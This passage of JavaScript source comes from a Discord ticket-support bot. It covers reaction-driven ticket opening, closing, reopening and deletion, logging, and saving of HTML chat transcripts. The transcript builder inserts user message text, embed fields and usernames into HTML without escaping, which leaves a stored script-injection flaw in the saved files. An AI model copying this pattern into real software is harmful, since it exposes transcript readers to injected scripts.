                let trans = await message.guild.channels.cache.find(r => r.id == settings.transcript);
                let TR = '**OFF** <:Moff:822787579254013973>'; let TicketsCount = 0;
                let RT = 'true';
                let CT = '**Command** <:Mon:822787522852552724>';
                let PRVM = '**Message** <:Mon:822787522852552724>';
                let PRVT = '**Trasnscript** <:Mon:822787522852552724>'; let SPP = 'Not Set';
                if (role.id) {
                    SPP = `**${role}**`;
                    if (settings.close == '2') { CLS = '@everyone'; } else CLS = `${role}`;
                    if (settings.rename == '2') { RNM = '@everyone'; } else RNM = `${role}`;
                } else {
                    if (settings.close == '2') { CLS = '@everyone'; } else CLS = 'Support Team'
                    if (settings.rename == '2') { RNM = '@everyone'; } else RNM = 'Support Team'
                }
                if (settings.auto && settings.auto == '1') TR = '**ON** <:Mon:822787522852552724>';
                if (settings.auto && settings.auto == '2') TR = '**ON** <:Mon:822787522852552724>';
                if (settings.disable == '1') CT = '**Command** <:Moff:822787579254013973>'
                if (settings.disable == '2') RT = '**Reaction** <:Moff:822787579254013973>'
                if (settings.disable == '3') {
                    CT = '**Command** <:Moff:822787579254013973>';
                    RT = '**Reaction** <:Moff:822787579254013973>'
                }
                if (settings.prv == '1') PRVT = '**Transcript** <:Moff:822787579254013973>'
                if (settings.prv == '3') {
                    PRVM = '**Message** <:Moff:822787579254013973>';
                    PRVT = '**Trasncript** <:Moff:822787579254013973>'
                }
                if (!role.id) { CT = '**Command** <:Moff:822787579254013973>'; RT = '**Reaction** <:Moff:822787579254013973>' }
                if (settings.ReactionMessage == null) RT = '**Reaction** <:Moff:822787579254013973>'; let CAU = '<:Moff:822787579254013973>'; let CAY = 'Disabled'
                if (!settings.claim || settings.claim == '3') { } else { CAU = '<:Mon:822787522852552724>' }
                if (settings.claim == '1') CAY = 'Disable \`VIEW_CHANNEL\`'; if (settings.claim == '2') CAY = 'Disable \`SEND_MESSAGES\`';
                if (RT == 'true') RT = `**[Reaction](https://discord.com/channels/${message.guild.id}/${settings.ReactionCannel}/${settings.ReactionMessage}) <:Mon:822787522852552724>**`
                message.guild.channels.cache.forEach(async channel => {
                    await GuildTranscripts.findOne({
                        channelID: channel.id
                    }, async (err, TT) => {
                        if (err) console.error(err);
                        if (!TT) return;
                        await TicketsCount++;
                    });
                });
                message.channel.startTyping()
                setTimeout(() => {
                    message.channel.stopTyping()
                    let embed = new Discord.MessageEmbed().setAuthor(`${message.guild.name} Info:`, `https://cdn.discordapp.com/icons/${message.channel.guild.id}/${message.channel.guild.icon}.png`)
                        .setColor('GREEN')
                        .addField(`**Tickets Toggle**`, `${RT} | ${CT}`)
                        .addField('**Prefix**', `\`${prefix}\``, true)
                        .addField(`**Auto Transcript**`, `${TR}`, true)
                    //.addField(`**Reation Tickets**`,`** **`,true)
                    let TicketLimit = settings.limit;
                    if (TicketLimit == '0') TicketLimit = 'Not Set'
                    let embed2 = new Discord.MessageEmbed()
                        .setColor('GREEN')
                        .addField(`**Support Role**`, `${SPP}`, true)
                        .addField(`**Logging Channel**`, `${log || 'Not Set'}`, true)
                        .addField(`**Tickets Category**`, `${cat || 'Not Set'}`, true)
                        //.addField(`**Logging Category**`,`${log||'Not Set'}`,true)
                        .addField(`**Transcript Channel**`, `${trans || 'Not Set'}`, true)
                        .addField(`**Tickets Limit**`, `${TicketLimit}`, true)
                        .addField(`**Tickets Count**`, `**${settings.count || '0'}** (${TicketsCount} Open)`, true)
                        .addField(`**Saved Tickets**`, `**${settings.history || 0} Transcript ⭐**`, true)
                        .addField(`**Private Message**`, `${PRVM} | ${PRVT}`, true)
                        .addField(`**${CAU} Claim Settings**`, `**${CAY}**`, true)
                    let embed3 = new Discord.MessageEmbed().setColor('GREEN').setTitle('Permissions:')
                        .addField(`**◻️ Command **close**: **`, `**${CLS}**`, true)
                        .addField(`**◻️ Command **rename**: **`, `**${RNM}**`, true)
                        //   .addField(`**◻️ Command **add**: **`,`**${CLS}**`,true)
                        //   .addField(`**◻️ Command **remove**: **`,`**${RNM}**`,true)
                        //   .addField(`**◻️ Command **save**: **`,`**${CLS}**`,true)
                        //   .addField(`**◻️ Command **delete**: **`,`**${RNM}**`,true)

                        .addField(`**⭐ Custom Emojies:**`, `**Close: ${settings.emClose || '🔒'} | Claim: ${settings.emClaim || '📌'} | Delete: ${settings.emDelete || '🚫'}
    Reopen: ${settings.emReopen || '🔓'} | Transcript: ${settings.emSave || '📧'}**`)
                        .setFooter('With all thanks to the developers.')

                    message.channel.send(embed).catch(err => null)
                    message.channel.send(embed2).catch(err => null)
                    message.channel.send(embed3).catch(err => null)
                }, 2 * 1000);
            }


        });
    });
});
client.on('raw', async packet => {
    if (packet.t !== 'MESSAGE_REACTION_ADD') return;
    if (!packet.d.guild_id) return;
    if (packet.d.user_id == client.user.id) return;
    Guildsettings.findOne({
        guildID: packet.d.guild_id
    }, async (err, guild) => {
        if (err) console.error(err);
        if (!guild) return
        let settings = guild;
        GuildTranscripts.findOne({
            channelID: packet.d.channel_id
        }, async (err, TRanss) => {
            if (packet.d.message_id == settings.ReactionMessage) {
                let Panel = settings;
                let emoji = packet.d.emoji.id ? `${packet.d.emoji.name}:${packet.d.emoji.id}` : packet.d.emoji.name;
                if (emoji == settings.ReactionEmoji) {
                    let channel = client.channels.cache.find(r => r.id == packet.d.channel_id);
                    let u = await channel.guild.members.fetch(`${packet.d.user_id}`);
                    channel.messages.fetch(packet.d.message_id).then(message => {
                        let re = message.reactions.cache.find(r => r.emoji.id == emoji.split(":")[1]) || message.reactions.cache.find(r => r.emoji.name == emoji);
                        let RR = message.reactions.resolve(`${re._emoji}`) || message.reactions.resolve(`${re._emoji.id}`)
                        RR.users.remove(`${u.id}`);
                        let WarnEmbed = new Discord.MessageEmbed().setTitle(`:x: Error`).setFooter(`Guild: ${channel.guild.name}`,
                            `https://cdn.discordapp.com/icons/${packet.d.guild_id}/${channel.guild.icon}.png`)
                            .setColor("RED");
                        if (settings.limit !== "0") {
                            let C = 0
                            channel.guild.channels.cache.forEach(c => {
                                if (c.topic == u.id) C++
                            });
                            if (C >= settings.limit) {
                                if (settings.lang == 'ar') { return u.send(WarnEmbed.setDescription(`**لا يمكنك فتح اكثر من \`${C}\` نذكره**`)); } else return u.send(WarnEmbed.setDescription(`**You can't create more than \`${C}\` ticket**`));
                            }
                        }
                        if (settings.disable == '2' || settings.disable == '3') {
                            if (settings.lang == 'ar') { return u.send("**هذا الأمر غير مفعل**"); } else return u.send(WarnEmbed.setDescription(`Creating Tickets in this guild is **OFF**!`));
                        }
                        // if (blacklist[channel.guild.id + u.id]) return u.send(WarnEmbed.setDescription(`**you're not allow to create tickets in this guild**`))
                        New(message, u, 'NONE', settings.prefix, settings, Panel)
                    })
                }
            }
            //})
            // })
            if (TRanss) {
                let emoji = packet.d.emoji.id ? `${packet.d.emoji.name}:${packet.d.emoji.id}` : packet.d.emoji.name;
                let emojiClose = '🔒'; let emojiClaim = '📌'; let emojiReopen = '🔓'; let emojiDelete = '🚫'; let emojiSave = '📧'; let emojiSaveP = '👤';
                if (settings.emClose && settings.emClose !== undefined && settings.emClose !== null) emojiClose = settings.emClose;
                if (settings.emClaim && settings.emClaim !== undefined && settings.emClaim !== null) emojiClaim = settings.emClaim;
                if (settings.emReopen && settings.emReopen !== undefined && settings.emReopen !== null) emojiReopen = settings.emReopen;
                if (settings.emDelete && settings.emDelete !== undefined && settings.emDelete !== null) emojiDelete = settings.emDelete;
                if (settings.emSave && settings.emSave !== undefined && settings.emSave !== null) emojiSave = settings.emSave;
                if (settings.emSaveP && settings.emSaveP !== undefined && settings.emSaveP !== null) emojiSaveP = settings.emSaveP;
                let chh = await client.channels.fetch(`${packet.d.channel_id}`);
                let u = await chh.guild.members.fetch(`${packet.d.user_id}`);
                let Eclose = emojiClose;
                if (emojiClose.length > 8) Eclose = (emojiClose.split("<:")[1] || emojiClose.split("<a:")[1]).split('>')[0]
                let Eclaim = emojiClaim;
                if (emojiClaim.length > 8) Eclaim = (emojiClaim.split("<:")[1] || emojiClaim.split("<a:")[1]).split('>')[0];
                let Ereopen = emojiReopen;
                if (emojiReopen.length > 8) Ereopen = (emojiReopen.split("<:")[1] || emojiReopen.split("<a:")[1]).split('>')[0]
                let Edelete = emojiDelete;
                if (emojiDelete.length > 8) Edelete = (emojiDelete.split("<:")[1] || emojiDelete.split("<a:")[1]).split('>')[0]
                let Esave = emojiSave;
                if (emojiSave.length > 8) Esave = (emojiSave.split("<:")[1] || emojiSave.split("<a:")[1]).split('>')[0]
                let EsaveP = emojiSaveP;
                if (emojiSaveP.length > 8) EsaveP = (emojiSaveP.split("<:")[1] || emojiSaveP.split("<a:")[1]).split('>')[0]
                let sourse = TRanss;
                if (packet.d.message_id == sourse.gnMessage) {
                    if (emoji == Eclose || emoji == '🔒') {
                        if (!u.hasPermission('MANAGE_CHANNELS')) {
                            if (!u.roles.cache.find(g => g.id === settings.suprole)) {
                                if (!settings.close || settings.close == '1') return;
                            }
                        }
                        chh.messages.fetch(`${packet.d.message_id}`).then(async message => {
                            let re = message.reactions.cache.find(r => r.emoji.id == emoji.split(":")[1]) || message.reactions.cache.find(r => r.emoji.name == emoji);
                            let RR = message.reactions.resolve(`${re._emoji}`) || message.reactions.resolve(`${re._emoji.id}`)
                            RR.users.remove(`${u.id}`); message.react('✅'); message.react('❎');
                        });
                    }
                    if (emoji == '❎') {
                        chh.messages.fetch(`${packet.d.message_id}`).then(async message => {
                            let rrr = message.reactions.cache.find(r => r.emoji.name == `❎`);
                            if (!rrr) return
                            rrr.remove().catch(err => { null })
                            let re = message.reactions.cache.find(r => r.emoji.name == `✅`);
                            if (!re) return
                            re.remove().catch(err => { null })
                        })
                    }
                    if (emoji == '✅') {
                        if (!u.hasPermission('MANAGE_CHANNELS')) {
                            if (!u.roles.cache.find(g => g.id === settings.suprole)) {
                                if (!settings.close || settings.close == '1') return;
                            }
                        }

                        let chh = await client.channels.fetch(`${packet.d.channel_id}`);
                        chh.messages.fetch(`${packet.d.message_id}`).then(async message => {
                            let re = message.reactions.cache.find(r => r.emoji.name == `✅`); if (re) re.remove();
                            let RR = message.reactions.cache.find(r => r.emoji.name == `❎`); if (RR) RR.remove();
                            let u = await chh.guild.members.fetch(`${packet.d.user_id}`);

                        });
                        if (sourse.clsmsg !== null) return;
                        sourse.members.forEach(id => {
                            chh.updateOverwrite(id, {
                                VIEW_CHANNEL: false
                            });
                        });

                        let TransMSG = `react with ${emojiSave} to save the transcript`;
                        let PrvMSG = `react with ${emojiSaveP} to send the Transcript to the opener`;
                        if (settings.auto == '1' || settings.auto == '2') TransMSG = `Auto transcript ${emojiSave} is **ON**`
                        if (settings.prv == '2') PrvMSG = `Auto Send ${emojiSaveP} is **ON**`
                        chh.send(new Discord.MessageEmbed().setDescription(`Ticket Closed by <@${packet.d.user_id}>`).setColor('#f6ff00'))
                        chh.send(new Discord.MessageEmbed().setDescription(`react with ${emojiDelete} to delete it
react with ${emojiReopen} to reopen it\n${TransMSG}\n${PrvMSG}`).setColor(RedC)
                        ).then(async MMSSGG => {
                            MMSSGG.react(emojiDelete).catch(err => MMSSGG.react('🚫')); MMSSGG.react(emojiReopen).catch(err => MMSSGG.react('🔓'))
                            if (settings.auto == null || settings.auto == '3') MMSSGG.react(emojiSave).catch(err => MMSSGG.react('📧'));
                            if (!settings.prv || settings.prv !== '2') MMSSGG.react(emojiSaveP).catch(err => MMSSGG.react('👤'))
                            TRanss.updateOne({
                                clsmsg: MMSSGG.id,
                                statu: 'close'
                            }).then(result => { })


                            let embed2 = new Discord.MessageEmbed()
                                .setColor(`YELLOW`)
                                .setTitle(`Ticket Closed`)
                                .setDescription(`Ticket : #${chh.name}\nby :<@${packet.d.user_id}>`)
                                .setTimestamp()
                                .setThumbnail(`http://i8.ae/HSPHw`)
                                .setFooter(packet.d.user_id);
                            if (settings.log !== null) {
                                let log = await client.channels.fetch(`${settings.log}`);
                                if (log) log.send({ embed: embed2 });
                                if (settings.auto == '1') {
                                    Save(chh, u || 'null', packet.d.user_id || 'null', settings, 'auto')
                                }

                            }
                        });
                    }

                    if (emoji == Eclaim || emoji == '📌') {
                        if (settings.claim == '3' || settings.claim == undefined) return;
                        ClaimReactionAdd(settings, chh, packet.d.message_id, u, sourse);
                    }
                }
                if (packet.d.message_id == sourse.clsmsg) {
                    if (emoji == Ereopen || emoji == '🔓') {
                        let chh = await client.channels.fetch(`${packet.d.channel_id}`);
                        chh.messages.fetch(packet.d.message_id).then(MM => MM.delete().catch(err => null)).catch(err => null)
                        chh.send(
                            new Discord.MessageEmbed().setColor('GREEN').setDescription(`Ticket reopend by <@${packet.d.user_id}>`));
                        sourse.members.forEach(id => {
                            chh.updateOverwrite(id, {
                                VIEW_CHANNEL: true
                            });
                        });
                        let embed2 = new Discord.MessageEmbed()
                            .setColor(`GREEN`)
                            .setTitle(`Ticket re-opened`)
                            .setDescription(`Ticket : #${chh.name}\nby :<@${packet.d.user_id}>`)
                            .setTimestamp()
                            .setThumbnail(`http://i8.ae/HSPHw`)
                            .setFooter(packet.d.user_id);
                        if (settings.log !== null) {
                            let log = await client.channels.fetch(`${settings.log}`);
                            if (log) log.send({ embed: embed2 });
                        }
                        TRanss.updateOne({
                            clsmsg: null,
                            statu: 'open',
                            t: 'false',
                            tp: 'false'
                        }).then(result => { })


                    }
                    if (emoji == Edelete || emoji == '🚫') {
                        let chh = await client.channels.fetch(`${packet.d.channel_id}`);
                        TRanss.updateOne({
                            clsmsg: null,
                            gnMessage: null
                        }).then(result => { })
                        chh.messages.fetch(packet.d.message_id).then(MM => MM.delete().catch(err => null)).catch(err => null)
                        chh.send(new Discord.MessageEmbed().setDescription(`Ticket will delete in 5s`)
                            .setColor(RedC));
                        let u = await client.users.fetch(`${packet.d.user_id}`);
                        if (settings.auto == '2') { Save(chh, u || 'null', packet.d.user_id || 'null', settings, 'auto') };
                        if (settings.prv == '2') {
                            let XC = chh.guild.members.cache.find(t => t.id == chh.topic)
                            if (XC !== null && XC !== undefined) { if (XC.id) Save(chh, XC, XC.id, settings, 'prv'); }
                        }
                        setTimeout(() => {
                            Close(chh, u, settings)
                        }, 5000);

                    }
                    if (emoji == Esave || emoji == '📧') {
                        if (TRanss.t == 'true') return
                        let channel = await client.channels.fetch(`${packet.d.channel_id}`);
                        let u = await client.users.fetch(channel.topic);
                        Save(channel, u || 'null', packet.d.user_id, settings, 'command');
                        TRanss.updateOne({
                            t: 'true'
                        }).then(result => { })
                    }
                    if (emoji == EsaveP || emoji == '👤') {
                        if (TRanss.tp == 'true') return
                        let channel = await client.channels.fetch(`${packet.d.channel_id}`);
                        let u = await client.users.fetch(channel.topic); if (!u) return;
                        Save(channel, u, u.id, settings, 'prv');
                        TRanss.updateOne({
                            tp: 'true'
                        }).then(result => { })

                    }
                }
            }
        });
    });
});

client.on('message', message => {
    if (message.channel.type == "dm" || !message.channel.guild) return; if (message.type == 'PINS_ADD') return
    GuildTranscripts.findOne({
        channelID: message.channel.id
    }, async (err, TRanss) => {
        if (err) console.error(err);
        if (!TRanss) return

        let BotTag = '<!-- -->'; if (message.author.bot) BotTag = ` <span class=chatlog__bot-tag>BOT</span>  `
        let Start = `
</div></div></div>
<div class="chatlog__message-group">
<div class="chatlog__author-avatar-container">
<img class=chatlog__author-avatar
src=https://cdn.discordapp.com/avatars/${message.author.id}/${message.author.avatar}.png?size=1024>
</div>
<div class="chatlog__messages">
<span
class="chatlog__author-name"
data-user-id=" ">${message.author.username}</span><span class="chatlog__timestamp">${BotTag}   ${moment().format('MMMM Do YYYY, h:mm A')}</span><div
class="chatlog__message">`
        let attachment = '<!--  -->'; let embed = '<!--  -->'; let HTMLfile = '<!-- -->';
        if (TRanss.last == message.author.id) Start = '<!-- X -->'
        TRanss.updateOne({ last: message.author.id }).then(result => { })
        let MSG = message.content;
        if (message.mentions.roles) {
            let CCC = '7289da';
            message.mentions.roles.forEach(async m => {
                if (m.color !== 0 || !m.color) CCC = m.color.toString(16);
                if (m.color == 0) CCC = '7289da';
                MSG = MSG.replace(`<@&${m.id}>`, `<font color="#${CCC}">@${m.name}</font> `);
            })
        }
        if (message.mentions.channels) {
            message.mentions.channels.forEach(async m => {
                MSG = MSG.replace(`<#${m.id}>`, `<font color="#7289da">#${m.name}</font> `);
            })
        }
        if (message.mentions.members) { message.mentions.members.forEach(async m => { MSG = MSG.replace(`<@!${m.id}>`, `<span class="mention">@${m.user.username}</span>`).replace(`<@${m.id}>`, `<span class="mention">@${m.user.username}</span>`); }) }
        if (message.attachments) {
            if (message.attachments.first()) {
                if (message.attachments.first().attachment) {
                    if (['html'].some(type => message.attachments.first().name.endsWith('html'))) {
                        HTMLfile = `
      <div class="chatlog__message">
      <div class=chatlog__attachment>
      <a href=https://tickettool.xyz/direct?url=${message.attachments.first().attachment}><font color = "#7289da">HTML Attachment: ${message.attachments.first().name
                            } (${message.attachments.first().size} B)</a></font></div></div>`
                    }
                    if (['jpg', 'jpeg', 'png', 'gif'].some(type => message.attachments.first().name.endsWith(type))) {
                        if (`${message.attachments.first().attachment}`)
                            attachment = `<div class="chatlog__message">
        <div class=chatlog__attachment>
        <a href=${message.attachments.first().attachment}>
          <img class=chatlog__attachment-thumbnail
          src=${message.attachments.first().attachment}>
        </a>
        </div></div>`;
                    }
                }
            }
        }
        if (message.embeds[0]) {
            let embedDisc = '<!-- -->'; let embedFields = '<!--Fields-->'; let timestamp = '<!-- -->'; let footerText = '<!-- -->'; let author = '<!-- -->'
            if (message.embeds[0].description) {
                let t = message.embeds[0].description.replace(':ballot_box_with_check:',
                    '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753214475546644/86c16c39d96283551fd4ca7392e22681.png>')
                    .replace('🔒',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753213632503848/c35b8b5c0666ad99ab0e820f8aa90002.png>')
                    .replace('🚫',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753214869815296/415fa55dc7f6a0a58dbdda2d33b29bf3.png>')
                    .replace('🔓',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753214077075486/8b7eb8b25468313916d2e5ec3727cd2d.png>')
                    .replace('📧',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753215104679936/701414a67cb18fe339ec2bbe21a1d448.png>')
                    .replace('👤',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753214282600468/f1719ecb228ce3c17b203ca4c15115c0.png>')
                    .replace('📌',
                        '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753213288554576/09204f6a96455580e749454b7449aa82.png>')

                    .replace(':lock:', '<img class=emoji src=https://cdn.discordapp.com/attachments/822869973457960960/906753213632503848/c35b8b5c0666ad99ab0e820f8aa90002.png>')
                embedDisc = `<div class="chatlog__embed-description">
<span class="markdown">${t}</span>
</div>`;

            }
            if (message.embeds[0].fields[0]) {
                message.embeds[0].fields.forEach(field => {
                    embedFields = `${embedFields}\n
<div class=chatlog__embed-fields><div class=chatlog__embed-field>
<div class=chatlog__embed-field-name><span class=markdown><font color = "white">${field.name}</font></span>
</div><div class=chatlog__embed-field-value>
<span class=markdown><strong><font color = "#d1d1d1">${field.value}</font></strong></span>
</div>
</div>
</div>
`});
            }
            if (message.embeds[0].timestamp !== null) timestamp = `${moment(message.embeds[0].timestamp).format('MMMM Do YYYY, h:mm A')}`
            if (message.embeds[0].footer) {
                if (message.embeds[0].footer.text) {
                    footerText = `${message.embeds[0].footer.text}`
                    if (message.embeds[0].timestamp !== null) footerText = `${message.embeds[0].footer.text} • `
                }
            }
            if (message.embeds[0].author !== null) author = `<div class=chatlog__embed-author>
<img class=chatlog__embed-author-icon src="${message.embeds[0].author.iconURL || '<!-- -->'}">
<span class=chatlog__embed-author-name>${message.embeds[0].author.name || '<!-- -->'}</span></div>`
            let CC = 'ffffff'; if (message.embeds[0].color !== null) CC = message.embeds[0].color.toString(16)
            embed = `<div class="chatlog__embed">
    <div
      class="chatlog__embed-color-pill"
      style="background-color:#${CC}"
    ></div>
    <div class="chatlog__embed-content-container">
      <div class="chatlog__embed-content">
        <div class="chatlog__embed-text">
          ${author}
          ${embedDisc}
          ${embedFields}
          <span class=chatlog__embed-footer-text>${footerText}${timestamp}</span>
        </div>
      </div>
    </div>
  </div>`
        }
        let MSGS = TRanss.messages;
        MSGS.push(`
${Start}
<div class="chatlog__content"><span class="markdown">${MSG}</span></div>
${HTMLfile}
${attachment}
${embed}
`)
        TRanss.updateOne({
            messages: MSGS
        }).then(result => { })

    });
});


async function Save(channel, u, uid, settings, Switch) {
    console.log(`${channel.name} || ${channel.id}`);
    channel.stopTyping();
    GuildTranscripts.findOne({
        channelID: channel.id
    }, async (err, TRanss) => {
        if (err) console.error(err); if (!TRanss) return;
        if (uid == 'null') return;
        if (u == 'null') return
        let mention;
        let icon = `https://cdn.discordapp.com/icons/${channel.guild.id}/${channel.guild.icon}.png`;
        if (channel.guild.icon == null || !channel.guild.icon) icon = 'https://cdn.discordapp.com/embed/avatars/0.png'
        if (u) mention = `Created by <span class="mention">@${u.username || u.user.username}</span> (ID:${u.id})`;
        let date = `${channel.guild.id}${Date.now()}${channel.id}`;
        MSGS = [];
        TRanss.messages.forEach(msg => {
            MSGS.push(msg);
        })
        setTimeout(() => {

            fs.appendFile(`./transcript-${date}.html`,
                `${website}<title>#${channel.name} Transcript</title>
<div class="info">
<div class="info__guild-icon-container">
  <img class=info__guild-icon
  src=${icon}>
</div>
<div class="info__metadata">
  <div class="info__guild-name">${channel.guild.name}</div>
  <div class="info__channel-name">#${channel.name}</div>
  <div class="info__channel-name">${mention}</div>
  <div class="info__channel-message-count">${TRanss.messages.length} message</div>
</div>
</div>
</head>
${TRanss.messages.join('\n')}
</html>
`, function (data, erorr) {
                let API = 'https://tickettool.xyz/direct?url='
                let embed = new Discord.MessageEmbed().setAuthor(`${u.tag || u.user.tag}`, u.avatarURL)
                    .addField(`**Ticket Owner**`, `${u}`, true)
                    .addField(`**Ticket Name**`, `${channel.name}`, true)
                    .addField(`**Channel**`, `${channel}`, true)
                    .setColor('GREEN');
                let MMS = []
                TRanss.members.forEach(M => {
                    MMS.push(`<@${M}>`);
                });
                setTimeout(() => {
                    fs.unlink(`./transcript-${date}.html`, function (err) {
                        if (err) throw err;
                    });
                }, 6000);
                if (MMS.join(' | ').length < 1998) embed.addField(`**Users in the Ticket**`, `${MMS.join(' | ')}`);
                if (Switch == 'prv') {
                    channel.send(new Discord.MessageEmbed().setColor("YELLOW").setDescription(`Sending Transcript..`)).then(MNB => {
                        u.send({
                            embed: embed, files: [{
                                attachment: `./transcript-${date}.html`, name: `./transcript-${channel.name}.html`
                            }]
                        })
                            .then(X => {
                                MNB.edit(new Discord.MessageEmbed().setColor("GREEN").setDescription(`Transcript Sent to ${u}`));
                                X.edit(embed.addField('**Actions**'
                                    , `[(Open in Browser)](${API}${X.attachments.first().url}) [(Download Transcript)](${X.attachments.first().url})`))

                            })
                            .catch(err => { MNB.edit(new Discord.MessageEmbed().setColor("RED").setDescription(`Failed to send`)) })
                    }).catch(err => null);
                }
                if (Switch == 'command' || Switch == 'auto') {
                    channel.send(new Discord.MessageEmbed().addField(`Saving Transcript..`, `** **`).setColor('YELLOW')).then(t => {
                        let TranscriptChannel = channel;
                        let SettingsChannel = channel.guild.channels.cache.find(X => X.id == settings.transcript);
                        if (SettingsChannel && SettingsChannel.name) TranscriptChannel = SettingsChannel;

                        TranscriptChannel.send({
                            embed: embed, files: [{
                                attachment: `./transcript-${date}.html`, name: `./transcript-${channel.name}.html`
                            }]
                        })
                            .then(X => {
                                X.edit(embed.addField('**Actions**'
                                    , `[(Open in Browser)](${API}${X.attachments.first().url}) [(Download Transcript)](${X.attachments.first().url})`));
                                if (SettingsChannel && SettingsChannel.name) {
                                    t.edit(
                                        new Discord.MessageEmbed().setDescription(`[Transcript Saved](https://discord.com/channels/${channel.guild.id}/${X.channel.id}/${X.id})`
                                        ).setColor('GREEN')).catch(err => null)
                                } else t.edit(new Discord.MessageEmbed().addField(`**:x: No Transcript Channel** | Saved here`, `to send the transcript channel use: \`tickets trans <ChannelID>\``).setColor('RED'))
                            }).catch(err => {
                                t.edit(new Discord.MessageEmbed().setDescription(`Faild To Send The Transcript To <#${settings.transcript}>\n**Please Check My permissions In That Channel**`
                                ).setColor('RED'))
                            });
                    });
                }
                if (Switch == 'autoBulk') {
                    let SettingsChannel = channel.guild.channels.cache.find(X => X.id == settings.transcript);
                    if (SettingsChannel && SettingsChannel.name) {

                        SettingsChannel.send({
                            embed: embed, files: [{
                                attachment: `./transcript-${date}.html`, name: `./transcript-${channel.name}.html`
                            }]
                        })
                            .then(X => {
                                X.edit(embed.addField('**Actions**'
                                    , `[(Open in Browser)](${API}${X.attachments.first().url}) [(Download Transcript)](${X.attachments.first().url})`));
                            }).catch(err => { });
                    }
                }






            })







        }, 500);

    })
}

client.on('guildCreate', async guild => {
    let XD = null;
    if (guild.roles.highest) XD = guild.roles.highest.id
    Guildsettings.findOne({
        guildID: guild.id
    }, async (err, GGG) => {
        if (err) console.error(err);
        if (!GGG) {
            console.log(`[${guild.name}] wasn't in my database! so i added it :)`);
            const newGuild = new Guildsettings({
                _id: mongoose.Types.ObjectId(),
                guildID: guild.id,
                prefix: Gprefix,
                category: null,
                suprole: null,
                log: null,
                transcript: null,
                count: 0,
                prv: 3,
                disable: null,
                limit: 0,
                auto: "off",
                tickets: [],
                lang: "en",
                history: 0,
            });
            newGuild.save();
        }
    });

});
client.on('channelDelete', async channel => {
    if (!channel.guild || channel.type == "dm") return;
    GuildTranscripts.findOne({
        channelID: channel.id
    }, async (err, res) => {
        if (err) console.error(err);
        if (res) {
            if (!channel.topic) return
            let u = await channel.guild.members.fetch(`${channel.topic}`).catch(err => null);
            if (u == null || u == undefined) return;
            if (!u.id) return;
            GuildTranscripts.findOne({
                channelID: channel.id
            }, async (err, TRanss) => {
                if (!TRanss) return
                if (u) {
                    Guildsettings.findOne({
                        guildID: channel.guild.id
                    }, async (err, guild) => {
                        if (err) console.error(err);
                        Deleted(channel, guild, u, TRanss);
                    });


                }

            })

        }

    });

    setTimeout(() => {
        GuildTranscripts.findOneAndDelete({
            channelID: channel.id
        }, (err, res) => {
            if (err) console.error(err)
        });
    }, 4000);


});
async function ClsMSG(settings, message, TRanss) {
    let emojiReopen = '🔓'; let emojiDelete = '🚫'; let emojiSave = '📧'; let emojiSaveP = '👤';
    if (settings.emReopen || settings.emReopen !== undefined) emojiReopen = settings.emReopen;
    if (settings.emDelete || settings.emDelete !== undefined) emojiDelete = settings.emDelete;
    if (settings.emSave || settings.emSave !== undefined) emojiSave = settings.emSave;
    if (settings.emSaveP || settings.emSaveP !== undefined) emojiSaveP = settings.emSaveP;
    let TransMSG = `react with ${emojiSave} to save the transcript`;
    if (settings.lang == 'ar') TransMSG = `اضغط علي ${emojiSave} لحفظ الرسائل`;
    if (settings.auto == '1' || settings.auto == '2') {
        if (settings.lang == 'ar') { TransMSG = `الحفظ الالي ${emojiSave} **مفعل**` } else TransMSG = `Auto transcript ${emojiSave} is **ON**`
    }
    if (settings.lang == 'ar') {
        message.channel.send(new Discord.MessageEmbed().setDescription(`تم اغلاق التذكره بواسطة <@${message.author.id}>`).setColor(RedC))
    } else message.channel.send(new Discord.MessageEmbed().setDescription(`Ticket Closed by <@${message.author.id}>`).setColor('#f6ff00'));
    let PrvMSG = `react with ${emojiSaveP} to send the Transcript to the opener`;
    if (settings.prv == '2') PrvMSG = `Auto Send ${emojiSaveP} is **ON**`
    let CFS = new Discord.MessageEmbed().setDescription(`react with ${emojiDelete} to delete it
react with ${emojiReopen} to reopen it\n${TransMSG}\n${PrvMSG}`)
        .setColor('#9b0000')
    if (settings.lang == 'ar') CFS = new Discord.MessageEmbed().setDescription(`اضغط علي  ${emojiDelete} لمسح التذكره
اضغط علي ${emojiReopen} لاعاده فتح التذكره\n${TransMSG}\nاضغط علي ${emojiSaveP} لارسال نسخه الرسائل الي فاتح التذكره`)
        .setColor('#9b0000')
    message.channel.send(CFS).then(MMSSGG => {
        MMSSGG.react(emojiDelete).catch(err => MMSSGG.react('🚫'))
        MMSSGG.react(emojiReopen).catch(err => MMSSGG.react('🔓'))
        if (settings.auto == null || settings.auto == '3') MMSSGG.react(emojiSave).catch(err => MMSSGG.react('📧'))
        if (!settings.prv || settings.prv !== '2') MMSSGG.react(emojiSaveP).catch(err => MMSSGG.react('👤'))


        TRanss.updateOne({
            clsmsg: MMSSGG.id, statu: 'close'
        }).then(result => { })
        if (settings.auto == '1') {
            Save(message.channel, message.author || 'null', message.author.id || 'null', settings, 'auto')
        }
    }); let xx = new Discord.MessageEmbed()
        .setColor(`YELLOW`)
        .setTitle(`Ticket Closed`)
        .setDescription(`Ticket : #${message.channel.name}\nby :${message.author}`)
        .setTimestamp()
        .setThumbnail(`http://i8.ae/HSPHw`)
        .setFooter(message.author.id);
    if (settings.lang == 'ar') xx = new Discord.MessageEmbed()
        .setColor(`YELLOW`)
        .setTitle(`اغلاق تذكره`)
        .setDescription(`التذكره : #${message.channel.name}\nبواسطة :${message.author}`)
        .setTimestamp()
        .setThumbnail(`http://i8.ae/HSPHw`)
        .setFooter(message.author.id);
    if (settings.log !== null) {
        let log = await client.channels.fetch(`${settings.log}`);
        if (log) log.send({ embed: xx }).catch(err => null);
    }

}
async function ClaimReactionAdd(settings, chh, MsgID, u, sourse) {
    chh.messages.fetch(`${MsgID}`).then(async message => {
        if (!u.hasPermission('MANAGE_GUILD')) {
            if (!u.roles.cache.find(g => g.id === settings.suprole)) return;
        }
        if (sourse.clsmsg !== null) return;
        if (sourse.claimed == null) {
            if (!message.embeds[0]) return;
